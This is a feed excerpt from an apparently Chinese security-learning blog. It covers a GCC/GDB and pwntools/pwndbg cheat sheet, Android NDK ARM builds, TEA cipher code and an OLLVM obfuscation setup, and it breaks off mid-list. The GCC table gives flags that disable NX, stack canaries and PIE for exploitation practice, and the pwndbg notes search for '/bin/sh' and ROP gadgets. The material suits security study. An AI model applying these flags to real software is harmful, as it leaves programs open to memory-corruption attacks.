            <description>GCC 编译常用命令    不带选项  gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。     -o 指定生成的输出文件； gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。   -E 仅执行编译预处理； gcc -E test.c -o test.i 将test.c预处理输出test.i文件。   -S 将C代码转换为汇编代码； gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。   -c 仅执行编译操作，不进行连接操作。 gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。   -wall 显示警告信息；    无选项链接  gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。   -O 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长 gcc -O1 test.c -o test    关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.</description>
            <content type="html"><![CDATA[<h3 id="gcc-编译常用命令">GCC 编译常用命令</h3>
<table>
<thead>
<tr>
<th align="center">不带选项</th>
<th></th>
<th>gcc test.c        将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">-o</td>
<td>指定生成的输出文件；</td>
<td>gcc test.c -o test  将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。</td>
</tr>
<tr>
<td align="center">-E</td>
<td>仅执行编译预处理；</td>
<td>gcc -E test.c -o test.i   将test.c预处理输出test.i文件。</td>
</tr>
<tr>
<td align="center">-S</td>
<td>将C代码转换为汇编代码；</td>
<td>gcc -S test.i   将预处理输出文件test.i汇编成test.s文件。</td>
</tr>
<tr>
<td align="center">-c</td>
<td>仅执行编译操作，不进行连接操作。</td>
<td>gcc -c test.s   将汇编输出文件test.s编译输出test.o文件。</td>
</tr>
<tr>
<td align="center">-wall</td>
<td>显示警告信息；</td>
<td></td>
</tr>
<tr>
<td align="center"><strong>无选项链接</strong></td>
<td></td>
<td>gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。</td>
</tr>
<tr>
<td align="center">-O</td>
<td>使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长</td>
<td>gcc -O1 test.c -o test</td>
</tr>
<tr>
<td align="center"></td>
<td>关掉DEP/NX（堆栈不可执行）</td>
<td>gcc  -z execstack -o level level.c</td>
</tr>
<tr>
<td align="center"></td>
<td>关掉Stack Protector/Canary（栈保护）</td>
<td>gcc -fno-stack-protector -o level level.c</td>
</tr>
<tr>
<td align="center"></td>
<td>关掉程序ASLR/PIE（程序随机化保护）</td>
<td>gcc -no-pie level level.c</td>
</tr>
<tr>
<td align="center"></td>
<td>64位linux下面的GCC编译出一个32位可执行程序</td>
<td>gcc -m32 -z execstack -fno-stack-protector -o level level.c</td>
</tr>
</tbody>
</table>
<h3 id="gdb常用调试命令">GDB常用调试命令</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">gcc <span style="color:#f92672">-</span>g  main.c                      <span style="color:#75715e">//在目标文件加入源代码的信息
</span><span style="color:#75715e"></span>gdb a.out       

(gdb) start                         <span style="color:#75715e">//开始调试
</span><span style="color:#75715e"></span>(gdb) n                             <span style="color:#75715e">//一条一条执行
</span><span style="color:#75715e"></span>(gdb) step<span style="color:#f92672">/</span>s                        <span style="color:#75715e">//执行下一条，如果函数进入函数
</span><span style="color:#75715e"></span>(gdb) backtrace<span style="color:#f92672">/</span>bt                  <span style="color:#75715e">//查看函数调用栈帧
</span><span style="color:#75715e"></span>(gdb) info<span style="color:#f92672">/</span>i locals                 <span style="color:#75715e">//查看当前栈帧局部变量
</span><span style="color:#75715e"></span>(gdb) frame<span style="color:#f92672">/</span>f                       <span style="color:#75715e">//选择栈帧，再查看局部变量
</span><span style="color:#75715e"></span>(gdb) print<span style="color:#f92672">/</span>p                       <span style="color:#75715e">//打印变量的值
</span><span style="color:#75715e"></span>(gdb) finish                        <span style="color:#75715e">//运行到当前函数返回
</span><span style="color:#75715e"></span>(gdb) set var sum<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>                 <span style="color:#75715e">//修改变量值
</span><span style="color:#75715e"></span>(gdb) list<span style="color:#f92672">/</span>l <span style="color:#960050;background-color:#1e0010">行号或函数名</span>             <span style="color:#75715e">//列出源码
</span><span style="color:#75715e"></span>(gdb) display<span style="color:#f92672">/</span>undisplay sum         <span style="color:#75715e">//每次停下显示变量的值/取消跟踪
</span><span style="color:#75715e"></span>(gdb) <span style="color:#66d9ef">break</span><span style="color:#f92672">/</span>b  <span style="color:#960050;background-color:#1e0010">行号或函数名</span>           <span style="color:#75715e">//设置断点
</span><span style="color:#75715e"></span>(gdb) <span style="color:#66d9ef">continue</span><span style="color:#f92672">/</span>c                    <span style="color:#75715e">//连续运行
</span><span style="color:#75715e"></span>(gdb) info<span style="color:#f92672">/</span>i breakpoints            <span style="color:#75715e">//查看已经设置的断点
</span><span style="color:#75715e"></span>(gdb) delete breakpoints <span style="color:#ae81ff">2</span>          <span style="color:#75715e">//删除某个断点
</span><span style="color:#75715e"></span>(gdb) disable<span style="color:#f92672">/</span>enable breakpoints <span style="color:#ae81ff">3</span>  <span style="color:#75715e">//禁用/启用某个断点
</span><span style="color:#75715e"></span>(gdb) <span style="color:#66d9ef">break</span> <span style="color:#ae81ff">9</span> <span style="color:#66d9ef">if</span> sum <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>           <span style="color:#75715e">//满足条件才激活断点
</span><span style="color:#75715e"></span>(gdb) run<span style="color:#f92672">/</span>r                         <span style="color:#75715e">//重新从程序开头连续执行
</span><span style="color:#75715e"></span>(gdb) watch input[<span style="color:#ae81ff">4</span>]                <span style="color:#75715e">//设置观察点
</span><span style="color:#75715e"></span>(gdb) info<span style="color:#f92672">/</span>i watchpoints            <span style="color:#75715e">//查看设置的观察点
</span><span style="color:#75715e"></span>(gdb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">7</span>b input                    <span style="color:#75715e">//打印存储器内容，b--每个字节一组，7--7组
</span><span style="color:#75715e"></span>(gdb) disassemble                   <span style="color:#75715e">//反汇编当前函数或指定函数
</span><span style="color:#75715e"></span>(gdb) si                            <span style="color:#75715e">// 一条指令一条指令调试 而 s 是一行一行代码
</span><span style="color:#75715e"></span>(gdb) info registers                <span style="color:#75715e">// 显示所有寄存器的当前值
</span><span style="color:#75715e"></span>(gdb) x<span style="color:#f92672">/</span><span style="color:#ae81ff">20</span> <span style="color:#960050;background-color:#1e0010">$</span>esp                    <span style="color:#75715e">//查看内存中开始的20个数
</span><span style="color:#75715e"></span>ni <span style="color:#960050;background-color:#1e0010">单步执行不进入</span> 
si <span style="color:#960050;background-color:#1e0010">单步执行并进入</span>
disas addr <span style="color:#960050;background-color:#1e0010">对地址</span>addr处的指令进行反汇编<span style="color:#960050;background-color:#1e0010">，</span>addr可以是函数名 
checksec <span style="color:#960050;background-color:#1e0010">查看</span>elf编译的保护选项<span style="color:#960050;background-color:#1e0010">。</span> 
</code></pre></div><h4 id="查壳">查壳</h4>
<blockquote>
<p>upx -d file</p>
</blockquote>
<h4 id="objjump">objjump</h4>
<blockquote>
<p>objdump是二进制文件快速查看工具。   常用命令：</p>
<ol>
<li><code>objdump -d [file]</code> 查看文件的所有汇编代码</li>
<li><code>objdump -f [file]</code> 查看文件的每个文件的整体头部摘要</li>
</ol>
</blockquote>
<p>####python</p>
<blockquote>
<ol>
<li><code>python -c &quot;...&quot; | ./file</code> python以命令方式执行并把结果传递给file</li>
<li><code>python -c &quot;...&quot; | xargs ./file</code> python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。</li>
<li><code>os.system()</code> 创建一个子进程</li>
<li><code>os.putenv(&quot;name&quot;, &quot;value&quot;)</code> 添加一个环境变量</li>
</ol>
</blockquote>
<h4 id="pwntools">pwntools</h4>
<blockquote>
<p>参考 
<a href="http://pwntools.readthedocs.io/en/stable/">http://pwntools.readthedocs.io/en/stable/</a>   （官网介绍）</p>
<p><a href="http://brieflyx.me/2015/python-module/pwntools-intro/">http://brieflyx.me/2015/python-module/pwntools-intro/</a></p>
<p><a href="http://brieflyx.me/2015/python-module/pwntools-advanced/">http://brieflyx.me/2015/python-module/pwntools-advanced/</a></p>
</blockquote>
<blockquote>
<p>一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。</p>
<p>常用的模块有下面几个： 
- ==asm==:汇编与反汇编 
- ==dynelf==:用于远程符号泄露，需要提供leak方法 
- ==elf==:对elf文件进行操作 
- ==gdb==:配合gdb进行调试 
- ==memleak==:用于内存泄漏 
- ==shellcraft==: shellcode的生成器 
- ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE 
- ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等</p>
</blockquote>
<h4 id="pwndbg">pwndbg</h4>
<ul>
<li>arena 堆检查</li>
<li>mp 显示堆</li>
<li>bins,fastbins,unsorted,smallbins,largebins</li>
<li>heap</li>
<li>top_chunk</li>
<li>procinfo 查看当前进程状态</li>
<li>rop <code>rop --grep &quot;pop rdi&quot; -- --nojop --nosys --depth 2</code></li>
<li>search <code>search -s “/bin/sh”</code></li>
<li>vvmap 虚拟内存映射</li>
<li>telescope 检查内存转储</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Android-ARM进阶</title>
            <link>https://kuekiko.top/posts/2018/10/android-arm%E8%BF%9B%E9%98%B6/</link>
            <pubDate>Wed, 10 Oct 2018 16:40:20 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/10/android-arm%E8%BF%9B%E9%98%B6/</guid>
            <description>学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。
NDK-Build的使用 可以参考官方文档。
  创建一个Android项目
  cd 项目目录
  /ndk-build 。也可以将NDK-build加入环境变量。
  创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）
//Android.mkLOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)# 要生成的.so库名称LOCAL_MODULE := hello# c++文件LOCAL_SRC_FILES := hello.cppinclude $(BUILD_SHARED_LIBRARY)//Application.mkAPP_PLATFORM := android-17# APP_ABI := allAPP_ABI :=armeabi-v7a arm64-v8a添加hello.cpp：
#include&amp;lt;cstdio&amp;gt;int i,j;int num[] = {1,2,3,4,5};int main(){/* code */printf(&amp;#34;hello,world!\n&amp;#34;);for(i=0;i&amp;lt;5;i++){printf(&amp;#34;num value is %d\n&amp;#34;,num[i]);}return 0;}  ndk-build</description>
            <content type="html"><![CDATA[<p>学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。</p>
<h3 id="ndk-build的使用">NDK-Build的使用</h3>
<p>可以参考<a href="https://developer.android.com/ndk/guides/ndk-build?hl=zh-cn">官方文档</a>。</p>
<ol>
<li>
<p>创建一个Android项目</p>
</li>
<li>
<p>cd 项目目录</p>
</li>
<li>
<p><!-- raw HTML omitted -->/ndk-build   。也可以将NDK-build加入环境变量。</p>
</li>
<li>
<p>创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mk" data-lang="mk"><span style="color:#960050;background-color:#1e0010">//Android.mk</span>
LOCAL_PATH <span style="color:#f92672">:=</span> <span style="color:#66d9ef">$(</span>call my-dir<span style="color:#66d9ef">)</span>
<span style="color:#960050;background-color:#1e0010">include</span> <span style="color:#66d9ef">$(</span>CLEAR_VARS<span style="color:#66d9ef">)</span>
   
<span style="color:#75715e"># 要生成的.so库名称
</span><span style="color:#75715e"></span>LOCAL_MODULE <span style="color:#f92672">:=</span> hello
<span style="color:#75715e"># c++文件
</span><span style="color:#75715e"></span>LOCAL_SRC_FILES <span style="color:#f92672">:=</span> hello.cpp
<span style="color:#960050;background-color:#1e0010">include</span> <span style="color:#66d9ef">$(</span>BUILD_SHARED_LIBRARY<span style="color:#66d9ef">)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mk" data-lang="mk"><span style="color:#960050;background-color:#1e0010">//Application.mk</span>
APP_PLATFORM <span style="color:#f92672">:=</span> android-17
<span style="color:#75715e"># APP_ABI := all
</span><span style="color:#75715e"></span>APP_ABI <span style="color:#f92672">:=</span>armeabi-v7a arm64-v8a
</code></pre></div><p>添加hello.cpp：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> i,j;
<span style="color:#66d9ef">int</span> num[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>};
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
    <span style="color:#75715e">/* code */</span>
    printf(<span style="color:#e6db74">&#34;hello,world!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>;i<span style="color:#f92672">++</span>){
        printf(<span style="color:#e6db74">&#34;num value is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,num[i]);
    }
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div></li>
<li>
<p><code>ndk-build</code></p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180814152220.png" alt=""></p>
</li>
<li>
<p>push 到Android设备运行</p>
<p>这里ARM32位出现里非法引用（Illegal instruction）。。之后再试试</p>
<p>改成ARM64之后又出现内存区段错误“Segmentation fault”  有毒呀。。可能是哪里设置有问题。。</p>
</li>
</ol>
<h3 id="arm-linux-gcc交叉编译器编译">arm-linux-gcc交叉编译器编译</h3>
<p>arm-linux-gcc也能编译出ARM可执行文件。<code>sudo apt install g++-arm-linux-gnueabihf </code></p>
<p>或者下载<a href="https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads">二进制</a>文件安装。</p>
<p><code>arm-linux-gnueabihf-g++  -static  helloworld.cpp </code></p>
<p>push进Android之后运行成功</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180814164353.png" alt=""></p>
<p>使用这个方法和用NDK-build编译的有差异。</p>
<h3 id="for循环">for循环</h3>
<p>待添加</p>
<h3 id="if-else">if-else</h3>
<p>待添加</p>
<h3 id="while">while</h3>
<h3 id="switch">switch</h3>
<h3 id="优化">优化</h3>
<p>###C++</p>
<h3 id="jni-api分析">JNI API分析</h3>
]]></content>
        </item>
        
        <item>
            <title>TEA加密与解密</title>
            <link>https://kuekiko.top/posts/2018/09/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</link>
            <pubDate>Tue, 11 Sep 2018 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/09/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</guid>
            <description>TEA加密与解密  TEA算法由剑桥大学计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组密码算法，其明文密文块为64比特，密钥长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。
 在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有很强的抗差分分析能力，加密速度也比较快。可以根据项目需求设置加密轮数来增加加密强度。主要运用了移位和异或运算。密钥在加密过程中始终不变。
 差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。
  加密核心函数  void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){unsigned int y = *firstChunk;unsigned int z = *secondChunk;unsigned int sum = 0;unsigned int delta = 0x9e3779b9;for (int i = 0; i &amp;lt; 8; i++) //8轮运算(需要对应下面的解密核心函数的轮数一样) {sum += delta;y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]);z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]);}*firstChunk = y;*secondChunk = z;} 算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&amp;ndash;&amp;gt; delta = 0x9e3779b9;</description>
            <content type="html"><![CDATA[<h2 id="tea加密与解密">TEA加密与解密</h2>
<blockquote>
<p><a href="https://baike.baidu.com/item/TEA%E7%AE%97%E6%B3%95/10167844">TEA算法</a>由<a href="https://baike.baidu.com/item/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6/278542">剑桥大学</a>计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95">密码算法</a>，其明文密文块为64比特，<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的<a href="https://baike.baidu.com/item/%E8%BF%AD%E4%BB%A3">迭代</a>次数可以改变，建议的迭代次数为32轮。</p>
</blockquote>
<p>在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有<strong>很强的抗差分分析能力</strong>，<strong>加密速度也比较快</strong>。可以根据项目需求设置加密轮数来增加加密强度。<em>主要运用了移位和异或运算。密钥在加密过程中始终不变。</em></p>
<blockquote>
<p>差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。</p>
</blockquote>
<ol>
<li>加密核心函数</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">EncryptTEA</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>firstChunk, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>secondChunk, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> key)
{
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> y <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>firstChunk;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> z <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>secondChunk;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> delta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9e3779b9</span>;

    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>)  <span style="color:#75715e">//8轮运算(需要对应下面的解密核心函数的轮数一样)
</span><span style="color:#75715e"></span>    {
        sum <span style="color:#f92672">+=</span> delta;
        y <span style="color:#f92672">+=</span> ((z <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">^</span> (z <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">1</span>]);
        z <span style="color:#f92672">+=</span> ((y <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">^</span> (y <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">3</span>]);
    }

    <span style="color:#f92672">*</span>firstChunk <span style="color:#f92672">=</span> y;
    <span style="color:#f92672">*</span>secondChunk <span style="color:#f92672">=</span> z;
}
</code></pre></div><blockquote>
<p>算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&ndash;&gt;  delta = 0x9e3779b9;</p>
</blockquote>
<ol start="2">
<li>
<p>解密核心函数</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">DecryptTEA</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>firstChunk, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>secondChunk, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> key)
{
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>  sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>  y <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>firstChunk;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>  z <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>secondChunk;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>  delta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9e3779b9</span>;
   
    sum <span style="color:#f92672">=</span> delta <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#75715e">//32轮运算，所以是2的5次方；16轮运算，所以是2的4次方；8轮运算，所以是2的3次方
</span><span style="color:#75715e"></span>   
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>) <span style="color:#75715e">//8轮运算
</span><span style="color:#75715e"></span>    {
        z <span style="color:#f92672">-=</span> (y <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> y <span style="color:#f92672">+</span> sum <span style="color:#f92672">^</span> (y <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">3</span>];
        y <span style="color:#f92672">-=</span> (z <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> z <span style="color:#f92672">+</span> sum <span style="color:#f92672">^</span> (z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> key[<span style="color:#ae81ff">1</span>];
        sum <span style="color:#f92672">-=</span> delta;
    }
   
    <span style="color:#f92672">*</span>firstChunk <span style="color:#f92672">=</span> y;
    <span style="color:#f92672">*</span>secondChunk <span style="color:#f92672">=</span> z;
}
</code></pre></div></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>OLLVM 混淆之一</title>
            <link>https://kuekiko.top/posts/2018/09/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</link>
            <pubDate>Mon, 10 Sep 2018 20:39:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/09/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</guid>
            <description>OLLVM OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为4.0。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。
 LLVM是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看WIKI-LLVM  经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。
对IR的处理过程下图：
OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。
OLLVM-Android环境搭建 前提环境：
 NDK环境 LLVM  下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：
 $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator///（cmake -G &amp;#34;MinGW Makefiles&amp;#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows)$ make -j7 //这个数字自己看自己CPU填 太小可能非常编译慢  可以参照官方wiki来操作。编译完成后，二进制文件放在build/bin目录下。
配置整合NDK：
  打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。</description>
            <content type="html"><![CDATA[<h3 id="ollvm">OLLVM</h3>
<p>OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为<a href="https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0">4.0</a>。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。</p>
<ul>
<li><a href="http://llvm.org/">LLVM</a>是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看<a href="https://zh.wikipedia.org/wiki/LLVM">WIKI-LLVM</a></li>
</ul>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180823112535.png" alt=""></p>
<p>经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。</p>
<p>对IR的处理过程下图：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180823113111.png" alt="IR Pass"></p>
<p>OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。</p>
<h3 id="ollvm-android环境搭建">OLLVM-Android环境搭建</h3>
<p>前提环境：</p>
<ul>
<li>NDK环境</li>
<li>LLVM</li>
</ul>
<p>下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：</p>
<blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git
$ mkdir build
$ cd build
$ cmake -DCMAKE_BUILD_TYPE<span style="color:#f92672">=</span>Release ../obfuscator/
//（cmake -G <span style="color:#e6db74">&#34;MinGW Makefiles&#34;</span> -DCMAKE_BUILD_TYPE<span style="color:#f92672">=</span>Release ../obfuscator/）<span style="color:#f92672">(</span>windows<span style="color:#f92672">)</span>
$ make -j7   //这个数字自己看自己CPU填 太小可能非常编译慢 
</code></pre></div></blockquote>
<p>可以参照<a href="https://github.com/obfuscator-llvm/obfuscator/wiki">官方wiki</a>来操作。编译完成后，二进制文件放在build/bin目录下。</p>
<p>配置整合NDK：</p>
<ol>
<li>
<p>打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。</p>
</li>
<li>
<p>将<code>\build\bin</code>目录下的<code>clang.exe</code>、<code>clang++.exe</code>和<code>clang-format.exe</code>复制到<code>\toolchains\llvm\prebuilt\windows-x86_64\bin</code>目录下，直接替换掉其中的文件。（Windows下）</p>
</li>
<li>
